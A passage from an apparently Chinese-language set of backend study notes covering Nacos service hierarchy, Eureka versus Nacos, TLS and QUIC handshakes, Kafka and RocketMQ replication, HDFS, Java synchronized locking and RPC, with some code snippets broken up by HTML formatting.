<li>127.0.0.1:8082</li>
<li>127.0.0.1:8083</li>
</ul>
<p>假如这些实例分布在不同机房，例如：</p>
<ul>
<li>127.0.0.1:8081，在上海机房</li>
<li>127.0.0.1:8082，在上海机房</li>
<li>127.0.0.1:8083，在杭州机房</li>
</ul>
<p>Nacos中提供了集群（<code>cluster</code>）的概念，来对应不同机房。也就是说，一个服务（<code>service</code>）下可以有很多集群（<code>cluster</code>），而一个集群（<code>cluster</code>）中下又可以包含很多实例（<code>instance</code>）。</p>
<p>如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MWM5ZmFmOTAzNGJlZTQ5NGI2YzYyMWNhN2IxZDZhMTJfeHlRVHBSVm44YmFteWZ2T0lVTWw0QUw4clJIaENxZGFfVG9rZW46T3hPR2JkU0FNb25UY014cktoZGNsZTNobmZkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>因此，结合我们上一节学习的<code>namespace</code>命名空间的知识，任何一个微服务的实例在注册到Nacos时，都会生成以下几个信息，用来确认当前实例的身份，从外到内依次是：</p>
<ul>
<li>namespace：命名空间</li>
<li>group：分组</li>
<li>service：服务名</li>
<li>cluster：集群</li>
<li>instance：实例，包含ip和端口</li>
</ul>
<p>这就是nacos中的服务分级模型。</p>
<p>在Nacos内部会有一个服务实例的注册表，是基于Map实现的，其结构与分级模型的对应关系如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTY3YTIxZGM5Y2VkNGVhYjNkNzMyNDk3OTAyYjhhODhfOHYyZTlZcEFkRzk0a0c2MjRuMER1Mjh1aVRuMkcyellfVG9rZW46QWV0UWI1N1Iwb1ZzVDN4R3lMSGNKckZDbnhlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="Eureka和Nacos">Eureka和Nacos</h3>
<p>微服务引入Eureka的方式也极其简单，分两步：</p>
<ul>
<li>引入<code>eureka-client</code>依赖</li>
<li>配置<code>eureka</code>地址</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODUyZDc4ZTllOTg4YmM3ZDQyYzdmNTFiZDE5ZTM0YWNfTFN2aDBaUUozSE4xbk1kZk1HbDhmcFAyV3FNR3Q4cTlfVG9rZW46TXlObmJFbVRZb2VLd014R2lBMWNMSTdkbnJmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>综上，Eureka和Nacos的相似点有：</p>
<ul>
<li>都支持服务注册发现功能</li>
<li>都有基于心跳的健康监测功能</li>
<li>都支持集群，集群间数据同步默认是AP模式，即最全高可用性</li>
</ul>
<p>Eureka和Nacos的区别有：</p>
<ul>
<li>Eureka的心跳是30秒一次，Nacos则是5秒一次</li>
<li>Eureka如果90秒未收到心跳，则认为服务疑似故障，可能被剔除。Nacos中则是15秒超时，30秒剔除。</li>
<li>Eureka每隔60秒执行一次服务检测和清理任务；Nacos是每隔5秒执行一次。</li>
<li>Eureka只能等微服务自己每隔30秒更新一次服务列表；Nacos即有定时更新，也有在服务变更时的广播推送</li>
<li>Eureka仅有注册中心功能，而Nacos同时支持注册中心、配置管理</li>
<li>Eureka和Nacos都支持集群，而且默认都是AP模式</li>
</ul>
<h2 id="远程调用">远程调用</h2>
<h3 id="负载均衡原理">负载均衡原理</h3>
<h3 id="切换负载均衡算法">切换负载均衡算法</h3>
<h2 id="服务保护">服务保护</h2>
<h1>Java篇</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjBlOThlYmY5OWNiYzdiMDVhOGU0Y2Y2NGMyOWYyZmNfU09MS3pMdkpUSU85NE4wajdmR1IzU2ljeHB6cDNXNTVfVG9rZW46WUEwRGJvb1Uyb2RjaWF4bXBYcWNkbE5pbko4XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDhiMTM1MWZlNDZlM2RkNTRhYjJjNTAzMzY4YmVlYTZfOTJQaWkxblZLNlV0TEl4Z281VlZVNzBBYVdBemZ0ckpfVG9rZW46UmtBT2J1UFFlb004VHB4bmJTSmN4ZXRTbm1mXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGUyMWI3Mjk3Mzg0NTZhMDY5MzdlMTk3Yzc3YTY5NjVfZTV6RTJzRHdFcXU0b1JSRzhHQUJyNG1CQWRUY2dFOE5fVG9rZW46WkZFcGJlU0Qyb2dzN0R4djBDM2NJVkd3bjYwXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>计网</h1>
<h2 id="mac地址和ip地址">mac地址和ip地址</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OGJhOWRlY2RhOTQxY2MyOTBmMmQ3YmY4MzU0ODE4YTdfTjBSS3FFd2doME42SG5kWDlYU3B1WEFnWTRJUnVmdWdfVG9rZW46Rkxjd2JPUEpMb2JpY1d4SzZIWWNPelBmbjJiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzgzNGExYWRhMzQxY2ExOTYwYTc1ODhmNjg3MmQ2ZDFfbGtmZVlMbUJ2YVQ2U0lNUll5SjUyeDYzRzFMSjd2bFVfVG9rZW46UUQ3NmJQbzJ3b29KSTd4akkxTWNjdWVibk5kXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Q2NzlhNDA5MGIzMDNmNzZkMjNiOTU3ZTJkZTY4NTNfVjZZWUE5NmhlNUE2RGNGdkozTmZ1NnpFakJweFUzODhfVG9rZW46UXhpU2JMNDJkb3VFRXR4RGZ0R2NnY1FhblROXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWJmZDI0MWIzNzdjOGYzMzg2ZjQ3OTYwYjcxMjQ4NWRfdVdQaFc2UHNmYlI3UFl6eWxhTHV6ZDJzRWNMNENpdkFfVG9rZW46QWZGZmJVV3BObzlGNDh4cTFMTGNxWFB2bm5kXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjJhMThiYmI0NmNhNDc1Mzk3NjEzZjczMWY3ZmQ4MjBfR08yRWxseGFyN1dHczhxa01RZ2RUbzJQQXFxdkZPbGZfVG9rZW46TDZ5cGJLMFQwb2k0SWR4WElUNGNld1VIbjdEXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<ol>
<li>
<h2 id="初始连接："><strong>初始连接：</strong></h2>
</li>
</ol>
<ul>
<li><strong>TCP + TLS 1.2（3 RTT）：</strong>
<ul>
<li>客户端和服务器进行 TCP 握手（1 RTT）。</li>
<li>随后，进行 TLS 握手（2 RTT），即客户端和服务器交换密钥和加密信息，以建立加密连接。</li>
<li>最后，数据传输开始（3 RTT）。</li>
<li>总共需要 3 次往返时间（RTT）来完成握手和数据传输的初始化过程。</li>
</ul>
</li>
<li><strong>TCP + TLS 1.3（2 RTT）：</strong>
<ul>
<li>客户端和服务器进行 TCP 握手（1 RTT）。</li>
<li>随后，进行 TLS 1.3 握手（1 RTT），与 TLS 1.2 不同，TLS 1.3 协议在握手过程中减少了一些步骤，从而减少了往返时间。</li>
<li>最后，数据传输开始（2 RTT）。</li>
<li>总共需要 2 次往返时间（RTT）来完成握手和数据传输的初始化过程。</li>
</ul>
</li>
<li><strong>QUIC（1 RTT）：</strong>
<ul>
<li>QUIC 协议本身在设计时考虑了减少握手的延迟。</li>
<li>在进行 QUIC 握手的同时，数据传输也可以开始。</li>
<li>这意味着客户端和服务器在首次建立连接时，只需要 1 次往返时间（RTT）即可完成握手和数据传输的开始。</li>
<li>QUIC 协议将 TCP 和 TLS 协议的功能合并到了一个协议中，从而减少了连接建立的延迟。</li>
</ul>
</li>
</ul>
<ol>
<li>
<h2 id="恢复连接："><strong>恢复连接：</strong></h2>
</li>
</ol>
<ul>
<li><strong>TCP + TLS 1.2（2 RTT）：</strong>
<ul>
<li>恢复连接时，仍然需要进行 TCP 握手（1 RTT）和 TLS 握手（1 RTT），总共需要 2 次往返时间（RTT）。</li>
</ul>
</li>
<li><strong>TCP + TLS 1.3（1 RTT）：</strong>
<ul>
<li>恢复连接时，TLS 1.3 支持 <strong>会话恢复</strong>，因此只需要 1 次往返时间（RTT）即可完成连接恢复，数据传输可以立刻开始。</li>
</ul>
</li>
<li><strong>QUIC（0 RTT）：</strong>
<ul>
<li>在 QUIC 协议中，<strong>0 RTT</strong> 连接恢复意味着在恢复连接时，客户端和服务器可以在不进行任何额外的握手步骤的情况下开始数据传输。</li>
<li>QUIC 通过使用之前保存的加密上下文，允许客户端在没有等待握手的情况下发送数据，这显著减少了恢复连接的延迟。</li>
</ul>
</li>
</ul>
<h1>Spring</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2IwMzg3OGQ5NTcyMjUzOGUxNzA5M2IyNmYwN2VkMTlfSnhvSXJTRDU4ekVCUE1lTjJvSEJNN1hQcEF4bDZiVmlfVG9rZW46UmtGNWI3bzRsb1FZMk54R0l6SWNxekRLbmVjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Njg2MWY0MDA5YWMwMDUxYjA5N2NkMjk2NGUzZTU2ZmZfeW12Q1BpY01kdW81ZXQxRTYzYVJraDB3UWF2UDlMVlhfVG9rZW46Sk5OT2JVdmZRb0ozVzh4UlJDdGNkRWJRbkpnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWI1ODY4Njk2NzYwZjNlODVhYWJmMTllNDk2YzM5ZDhfREQ5ZXlFc0NrVXoxQ3NFdzRDMUN0Um9lcnRnRExCb3BfVG9rZW46RFg4cGJxZWthb2Fob0R4OWlHQ2MzSUFlbmdoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTNiYzBlMmI0YWJmNTBlNjgwYWUxNjJmZjM2M2M5YTJfYU1FVjNNMFcxVHN5cWNqR095Z0p2NGRqbjdVenZSUTlfVG9rZW46SW91bmI5ZVVSb1Z3SjB4elc2U2MzdlUybjN3XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>Kafka 和 RocketMQ 的 broker 架构有什么区别</h1>
<p>如果 <strong>Leader 和所有 Follower 都同时宕机</strong>，那么数据确实会面临丢失的风险。因此，在分布式消息队列中，单纯 <strong>备份一份数据（副本因子=2）是很危险的</strong>。为了提高可靠性，Kafka 和 RocketMQ 都提供了 <strong>更高级的副本机制</strong> 来降低数据丢失的风险。</p>
<ol>
<li>
<h1><strong>Kafka：多副本机制（Replication Factor）</strong></h1>
</li>
</ol>
<h3 id="Leader-和-Follower-全挂了怎么办？"><strong>Leader 和 Follower 全挂了怎么办？</strong></h3>
<ul>
<li>在 Kafka 中，每个 <strong>Partition（分区）</strong> 都可以有 <strong>多个副本（Replication Factor &gt; 2）</strong>。</li>
<li>例如：
<ul>
<li><strong>如果 Replication Factor = 3</strong>（即每个分区有 3 份数据：1 个 Leader + 2 个 Follower）。</li>
<li><strong>只要有一个副本存活，数据就不会丢失</strong>。</li>
<li>如果 <strong>Leader 和 Follower 都挂了</strong>，但至少还有一个副本存活，Kafka 可以 <strong>从其他存活的副本中重新选举 Leader</strong>，继续提供服务。</li>
<li>但如果 <strong>所有副本都挂了</strong>，那么该 Partition 暂时不可用，可能会数据丢失（除非有额外的持久化方案，比如数据快照）。</li>
</ul>
</li>
</ul>
<h3 id="如何避免？"><strong>如何避免？</strong></h3>
<p>✅ <strong>副本数 ≥ 3</strong>，避免 Leader + 单个 Follower 都宕机。 ✅ <strong>ISR（In-Sync Replicas）</strong> 机制，确保至少有一个同步的 Follower 存在。 ✅ <strong>使用</strong> <strong>Kafka + HDFS</strong> <strong>归档数据</strong>，定期将 Kafka 数据存储到 <strong>HDFS 或云存储</strong>，防止数据丢失。</p>
<ol>
<li>
<h1><strong>RocketMQ：主从模式（Master-Slave）</strong></h1>
</li>
</ol>
<h3 id="Leader（Master）和-Follower（Slave）全挂了怎么办？"><strong>Leader（Master）和 Follower（Slave）全挂了怎么办？</strong></h3>
<ul>
<li>RocketMQ 默认是 <strong>一主一从（Master-Slave）</strong>，如果 <strong>Master 挂了，Slave 可提升为 Master</strong>。</li>
<li>但如果 <strong>Master 和 Slave 都挂了，消息就会丢失</strong>，除非采用 <strong>多副本方案</strong>。</li>
</ul>
<h3 id="如何避免？-2"><strong>如何避免？</strong></h3>
<p>✅ <strong>同步复制模式（SYNC_MASTER）</strong></p>
<ul>
<li>Slave <strong>必须确认数据已经存储成功，Master 才会认为消息写入成功</strong>。</li>
<li>这样如果 Master 宕机，Slave 仍然有完整数据。 ✅ <strong>三副本机制</strong>（多 Slave，主从同步复制）</li>
<li>一个 Master <strong>可以有多个 Slave</strong>，即 <strong>一主多从</strong>（Master-Slave-Slave）。</li>
<li>这样即使 Master + 一个 Slave 坏掉，仍然有数据存活。 ✅ <strong>消息存储归档（如搭配 MySQL/HDFS 备份）</strong></li>
<li>可以将重要的消息 <strong>异步写入数据库或对象存储（例如阿里云 OSS）</strong>，防止丢失。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NWM2Mjg4MjhkYmM5YzYxNDRmMWRjODhmNmZhODhiYmJfZDg0N0twcGE1WnlqalFIMkNpaHhjbTZuR2hMQzBGQXJfVG9rZW46SGtZbWJaSGM3b1VkNlh4Ym5QNWNaUlllbmpmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="Kafka-的-ISR（In-Sync-Replicas）"><strong>Kafka 的 ISR（In-Sync Replicas）</strong></h3>
<p>ISR（同步副本集）是 Kafka 保证高可用性的一种机制。Kafka 的 Topic 分区（Partition）有多个副本（Replica），其中 <strong>Leader 负责读写</strong>，<strong>Follower 负责同步数据</strong>。ISR 代表的是<strong>当前同步进度跟上 Leader 的 Follower 副本集合</strong>，只要 Leader 崩溃，Kafka 就会从 ISR 中选一个 Follower 作为新的 Leader。</p>
<h4 id="特点："><strong>特点</strong>：</h4>
<ol>
<li><strong>避免数据丢失</strong>：只有 ISR 中的 Follower 都确认收到数据后，Kafka 才认为消息提交成功。</li>
<li><strong>选 Leader</strong>：如果 Leader 崩溃，Kafka 会从 ISR 里挑选一个存活的副本作为新的 Leader。</li>
<li><strong>ISR 动态变化</strong>：如果某个 Follower 落后太多（无法跟上 Leader），它会被踢出 ISR，避免影响可用性。</li>
</ol>
<h4 id="示例："><strong>示例</strong>：</h4>
<p>假设 Kafka Topic <code>orders</code> 有 3 个副本（<code>Leader</code>, <code>Follower1</code>, <code>Follower2</code>），ISR 初始状态：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ISR</span> = &#123;Leader, Follower1, Follower2&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>正常情况</strong>：Leader 收到新消息 <code>order_123</code>，Follower1 和 Follower2 同步该消息，ISR 维持不变。</li>
<li><strong>Follower2 落后太多</strong>（比如由于网络问题），ISR 变成：</li>
<li><code>ISR = &#123;Leader, Follower1&#125;</code></li>
<li><strong>Leader 崩溃</strong>，Kafka 选 Follower1 作为新的 Leader。</li>
</ul>
<h3 id="HDFS（Hadoop-Distributed-File-System）"><strong>HDFS（Hadoop Distributed File System）</strong></h3>
<p>HDFS 主要用于存储 <strong>大规模分布式文件</strong>，采用 <strong>主从架构（Master-Slave）</strong>，核心组件有：</p>
<ol>
<li><strong>NameNode（主节点）</strong>：负责管理文件系统的元数据（目录结构、文件位置等）。</li>
<li><strong>DataNode（从节点）</strong>：实际存储数据，每个数据块有多个副本（默认 3 份）。</li>
<li><strong>Secondary NameNode</strong>：辅助 NameNode 处理日志合并，不是备份节点。</li>
</ol>
<h4 id="特点：-2"><strong>特点</strong>：</h4>
<ul>
<li><strong>强一致性</strong>：数据写入后，副本同步完成才算成功。</li>
<li><strong>多副本存储</strong>：通常存 3 份，分布在不同机器上，保证高可用。</li>
<li><strong>大文件优化</strong>：HDFS 适用于存储 GB~PB 级别的大文件，写入后不支持修改。</li>
</ul>
<h4 id="示例：-2"><strong>示例</strong>：</h4>
<p>假设有一个 1GB 的文件 <code>dataset.csv</code> 存入 HDFS，HDFS 会把它拆成多个 128MB 的数据块（Block），假设有 3 份副本：</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B<span class="function"><span class="title">lock1</span> -&gt;</span> (D<span class="function"><span class="title">ataNode1</span>, DataNode2, DataNode3) ``Block2 -&gt;</span> (DataNode2, DataNode3, DataNode4)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>DataNode1 宕机</strong>，其他 DataNode 还能提供数据，不影响读取。</li>
<li><strong>如果 NameNode 挂了</strong>，整个 HDFS 不可用（因为 NameNode 记录元数据）。</li>
<li><strong>DataNode 失败后</strong>，HDFS 发现副本不足，会自动复制数据，保持 3 份副本。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjhlYTA5YmQzNzAyNDcwZjA0Y2UxYmNkNmFlODQ2NTZfWWRiTFB2RUZ3TVJudDBFdmJ4Vk8xZU1PbUVWQUNVWU5fVG9rZW46UXRmTmI1eFZtb0N2bm54eEZTWGM1ZnNtbjJzXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjlmYWZiMTRmMDdiNmY0OWQyNGNiOTE1MTg0M2QwZTZfd3BpN1BUY1R1VzB0Z2htbWsyM09YNmlQSFFEM0JvODZfVG9rZW46TkxaR2JZamJwb0E0bEF4ckxJU2M3MlhtbmdiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<ol>
<li>Kafka 的 broker 架构：Kafka 的 broker 架构采用了分布式的设计，每个 Kafka broker 是一个独立的服务实例，负责存储和处理一部分消息数据。Kafka 的 topic 被分区存储在不同的 broker 上，实现了水平扩展和高可用性。</li>
<li>RocketMQ 的 broker 架构：RocketMQ 的 broker 架构也是分布式的，但是每个 RocketMQ broker 有主从之分，一个主节点和多个从节点组成一个 broker 集群。主节点负责消息的写入和消费者的拉取，从节点负责消息的复制和消费者的负载均衡，提高了消息的可靠性和可用性。</li>
</ol>
<h1><strong>Synchronized 竞争到锁的具体含义</strong></h1>
<h3 id="Synchronized-竞争到锁的具体含义"><strong>Synchronized 竞争到锁的具体含义</strong></h3>
<ol>
<li>
<h3 id="Synchronized-的锁对象"><strong>Synchronized 的锁对象</strong></h3>
</li>
</ol>
<p>在 Java 中，<code>synchronized</code> 是依赖于 <strong>对象头（Mark Word）</strong> 和 <strong>Monitor</strong> 实现的锁机制。</p>
<ul>
<li><strong>对象头（Mark Word）</strong> 存储了锁的信息（如是否被加锁、哪个线程持有锁等）。</li>
<li><strong>Monitor</strong> 由 JVM 实现，负责管理锁的竞争与释放。</li>
</ul>
<ol>
<li>
<h3 id="Synchronized-竞争到锁的过程"><strong>Synchronized 竞争到锁的过程</strong></h3>
</li>
</ol>
<p>当线程执行 <code>synchronized</code> 代码块或方法时，它需要<strong>竞争锁</strong>，成功获取锁的线程才能进入临界区。具体过程如下：</p>
<p><strong>（1）尝试修改对象头的 Mark Word</strong></p>
<ul>
<li>Mark Word 默认存储的是对象的 <strong>哈希码</strong> 或 <strong>锁状态信息</strong>。</li>
<li>竞争锁时，线程尝试将对象头中的 <strong>Mark Word</strong> 修改为<strong>当前线程 ID</strong>，表示成功获取锁。</li>
</ul>
<p><strong>（2）Monitor 关联 owner</strong></p>
<ul>
<li>如果 Mark Word 替换成功，说明该线程成功竞争到了锁，Monitor 的 <code>owner</code> 字段被设置为当前线程。</li>
<li>如果失败，说明其他线程已经持有锁，该线程就会进入<strong>阻塞状态</strong>，等待锁释放。</li>
</ul>
<ol>
<li>
<h3 id="具体例子"><strong>具体例子</strong></h3>
</li>
</ol>
<p>假设有以下 <code>synchronized</code> 代码：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SyncExample</span> </span>&#123;</span><br><span class="line">private static final Object lock = new Object(); <span class="string">``</span>public void <span class="function"><span class="keyword">method</span>() </span>&#123;</span><br></pre></td></tr></table></figure>
<p><code>synchronized (lock) &#123; ``     System.out.println(Thread.currentThread().getName() + &quot; 获取了锁&quot;); ``&#125;</code></p>
<p><code>&#125;</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>执行流程：</strong></p>
<ol>
<li>
<p><strong>线程 A 竞争锁：</strong></p>
<ol>
<li>尝试修改 <code>lock</code> 对象头的 Mark Word，将其设置为 <strong>线程 A 的 ID</strong>。</li>
<li><strong>成功</strong>：Monitor 记录 <code>owner = 线程 A</code>，线程 A 进入同步代码块。</li>
<li><strong>失败</strong>：说明另一个线程（如 B）已经持有锁，A 进入等待队列。</li>
</ol>
</li>
<li>
<p><strong>线程 B 竞争锁：</strong></p>
<ol>
<li>发现 <code>lock</code> 已被线程 A 持有，无法修改 Mark Word，进入 <strong>等待队列</strong>。</li>
</ol>
</li>
<li>
<p><strong>线程 A 释放锁：</strong></p>
<ol>
<li>退出 <code>synchronized</code> 代码块，恢复对象头 Mark Word，Monitor <code>owner</code> 置空。</li>
<li>通知等待队列中的线程 B，可以尝试获取锁。</li>
</ol>
</li>
<li>
<p><strong>线程 B 重新竞争：</strong></p>
<ol>
<li>线程 B 再次尝试修改 Mark Word，成功后进入 <code>synchronized</code> 代码块。</li>
</ol>
</li>
<li>
<h3 id="总结-3"><strong>总结</strong></h3>
</li>
</ol>
<p><strong>“Synchronized 竞争到锁” 具体指的是：</strong></p>
<ol>
<li><strong>当前线程成功将对象头的 Mark Word 修改为自己的线程 ID</strong>（CAS 操作成功）。</li>
<li><strong>Monitor 对象的</strong> <strong><code>owner</code></strong> <strong>字段指向当前线程</strong>，表示该线程成为锁的持有者。</li>
</ol>
<p>如果这两个条件不满足，线程就会进入<strong>等待队列</strong>，直到锁释放后再重新尝试获取。</p>
<h1>RPC</h1>
<p><strong>RPC（Remote Procedure Call，远程过程调用）</strong> 是一种让程序调用远程服务器上的函数，就像调用本地函数一样，而不需要关心底层的网络通信细节。</p>
<h2 id="🌟-RPC-的工作流程"><strong>🌟 RPC 的工作流程</strong></h2>
<p>RPC 典型调用过程通常包含以下 5 个步骤：</p>
<ol>
<li>
<h1><strong>客户端调用（Client Stub）</strong></h1>
</li>
</ol>
<p>客户端调用一个**“伪函数”**（存根 Stub），并传入所需的参数。</p>
<ul>
<li>这个存根 <strong>Stub</strong> 表面上看是一个本地函数，但它的任务是<strong>处理远程调用的相关逻辑</strong>，比如序列化数据、发送请求等。</li>
<li>这让客户端程序员可以像调用本地方法一样调用远程服务，而无需关心底层实现。</li>
</ul>
<p>🔹 <strong>示例（Java 代码）：</strong></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String result <span class="operator">=</span> remoteService.sayHello(<span class="string">&quot;Alice&quot;</span>)<span class="comment">; // 客户端像本地函数一样调用</span></span><br></pre></td></tr></table></figure>
<ol>
<li>
<h1><strong>请求发送（Request Marshaling &amp; Transmission）</strong></h1>
</li>
</ol>
<p>客户端的 Stub 会将调用的信息（方法名、参数等）进行<strong>序列化</strong>（Marshaling），然后通过网络发送到远程服务器。</p>
<ul>
<li>这个过程需要<strong>将数据转换为可以在网络上传输的格式</strong>（比如 JSON、Protocol Buffers、Thrift）。</li>
</ul>
<p>🔹 <strong>示例（序列化的请求数据 - JSON 格式）：</strong></p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">``</span>  <span class="string">&quot;method&quot;</span>: <span class="string">&quot;sayHello&quot;</span>, <span class="string">``</span>  <span class="string">&quot;params&quot;</span>: [<span class="string">&quot;Alice&quot;</span>] <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>
<h1><strong>服务器接收与处理（Server Stub &amp; Execution）</strong></h1>
</li>
</ol>
<p>服务器端的<strong>存根（Server Stub）</strong> 接收请求，进行<strong>反序列化</strong>（Unmarshaling），还原出<strong>方法名</strong>和<strong>参数</strong>。</p>
<ul>
<li>服务器调用相应的服务方法，执行具体的业务逻辑，并得到返回结果。</li>
</ul>
<p>🔹 <strong>示例（服务器端代码 - Java）：</strong></p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title class_">String</span> <span class="title function_">sayHello</span>(<span class="params"><span class="title class_">String</span> name</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>
<h1><strong>结果返回（Response Serialization &amp; Transmission）</strong></h1>
</li>
</ol>
<p>服务器执行完远程方法后，将<strong>返回值序列化</strong>，通过网络发送回客户端。</p>
<ul>
<li>和请求过程相同，返回结果需要<strong>转换为网络传输格式</strong>。</li>
</ul>
<p>🔹 <strong>示例（序列化的响应数据 - JSON 格式）：</strong></p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">``</span>  <span class="string">&quot;result&quot;</span>: <span class="string">&quot;Hello, Alice!&quot;</span> <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>
<h1><strong>客户端接收结果（Response Unmarshaling &amp; Return）</strong></h1>
</li>
</ol>
<p>客户端接收到服务器返回的结果后，进行<strong>反序列化</strong>，将数据转换回原始格式。</p>
<ul>
<li>最终，<strong>客户端 Stub 返回数据给调用方</strong>，整个 RPC 过程完成。</li>
</ul>
<p>🔹 <strong>示例（Java 代码）：</strong></p>
